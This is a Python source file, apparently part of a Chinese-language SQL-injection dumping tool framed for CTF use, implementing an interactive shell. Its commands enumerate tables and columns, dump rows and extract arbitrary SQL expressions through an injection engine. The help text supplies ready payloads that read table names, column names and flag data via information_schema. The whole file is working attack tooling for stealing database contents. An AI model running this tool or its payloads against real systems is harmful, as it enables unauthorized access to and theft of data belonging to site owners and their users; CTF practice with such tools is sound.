"""交互式 shell"""
from utils.helpers import format_row
from ui.progress import RollingBar


HELP = """
可用命令:
  tables              列出所有表
  columns <table>     列出某表所有列
  data <table>        抓取某表数据
  expr <SQL表达式>     直接提取任意 SQL 表达式（CTF 利器，快且准）
  db                  当前数据库名
  version             数据库版本
  user                当前用户
  stats               请求统计
  help                帮助
  q                   退出

expr 示例（一次抽走全部表名，比 tables 快几十倍）:
  expr (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())
  expr (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x666c6167)
  expr (SELECT GROUP_CONCAT(id,0x3a,content) FROM flag)
"""


def interactive_shell(dumper, db_name, max_rows=3, engine=None):
    print("\n" + "=" * 62)
    print("💡 输入 help 查看帮助，输入 q 退出")
    print("=" * 62 + "\n")

    tables_cache = None

    while True:
        try:
            cmd = input(">>> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        parts = cmd.split()
        action = parts[0].lower()

        if action in ("q", "quit", "exit"):
            break

        elif action in ("help", "?"):
            print(HELP)

        elif action == "db":
            print(f"  当前数据库: {db_name}")

        elif action == "version":
            print(f"  版本: {dumper.get_version()}")

        elif action == "user":
            print(f"  用户: {dumper.get_current_user()}")

        elif action == "stats":
            if engine and engine.req:
                st = engine.req.stats()
                print(f"  请求总数: {st['total']}")
                print(f"  错误数:   {st['errors']}")
                print(f"  总耗时:   {st['time']:.1f}s")

        elif action in ("expr", "sql"):
            # 取 "expr" 之后的原始内容，避免表达式里的空格被 split 掉
            sql_expr = cmd[len(parts[0]):].strip()
            if not sql_expr:
                print("  [!] 用法: expr <SQL表达式>，例如: "
                      "expr (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)")
                continue
            bar = RollingBar(width=20, prefix="  ")
            bar.start()
            try:
                val = dumper.eng.extract(sql_expr)
            except Exception as e:
                bar.stop()
                print(f"  [-] 提取失败: {e}")
                continue
            bar.stop(final_msg=f"  [+] {val}" if val else "  [-] (空)")

        elif action == "tables":
            if tables_cache is None:
                bar = RollingBar(width=20, prefix="  ")
                bar.start()
                tables_cache = dumper.get_tables(db_name)
                bar.stop()
            if not tables_cache:
                print("  (无表)")
            else:
                for t in tables_cache:
                    print(f"  - {t}")

        elif action == "columns":
            if len(parts) < 2:
                print("  [!] 用法: columns <table>")
                continue
            table = parts[1]
            bar = RollingBar(width=20, prefix=f"  {table} ")
            bar.start()
            cols = dumper.get_columns(db_name, table)
            bar.stop()
            if not cols:
                print(f"  [-] 表 {table} 不存在或没有列")
                continue
            for c in cols:
                print(f"  - {c}")

        elif action == "data":
            if len(parts) < 2:
                print("  [!] 用法: data <table>")
                continue
            table = parts[1]

            bar = RollingBar(width=20, prefix="  列名 ")
            bar.start()
            cols = dumper.get_columns(db_name, table)
            bar.stop(final_msg=f"  [+] 列: {', '.join(cols)}" if cols else "")

            if not cols:
                print(f"  [-] 表 {table} 不存在")
                continue

            bar = RollingBar(width=20, prefix="  数据 ")
            bar.start()
            rows = dumper.get_rows(table, cols, max_rows=max_rows)
            bar.stop()

            print(f"  📋 表 {table} 数据:")
            for row in rows:
                print(f"    {format_row(row)}")

        else:
            print(f"  [!] 未知命令: {cmd}")
            print(HELP)